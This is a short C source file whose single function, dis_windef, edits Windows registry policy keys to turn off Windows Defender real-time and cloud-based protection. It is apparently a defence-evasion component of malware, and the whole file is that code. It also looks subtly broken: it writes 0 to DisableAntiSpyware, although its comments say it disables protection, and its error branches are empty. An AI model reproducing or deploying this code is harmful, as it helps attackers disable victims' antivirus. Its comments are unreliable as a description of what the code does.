#include "disable_windef.h"



int dis_windef() {
    // Disable Windows Defender real-time protection
    
    HKEY hKey;
    DWORD value = 0;



    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueEx(hKey, L"DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&value, sizeof(DWORD)) == ERROR_SUCCESS) {
            
        }
        else {
            
        }
        RegCloseKey(hKey);
    }
    else {
        
    }

    // Disable Windows Defender cloud-based protection
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueEx(hKey, L"SpynetReporting", 0, REG_DWORD, (const BYTE*)&value, sizeof(DWORD)) == ERROR_SUCCESS) {
            
        }
        else {
            
        }
        RegCloseKey(hKey);
    }
    else {
        
    }

    return 0;
}

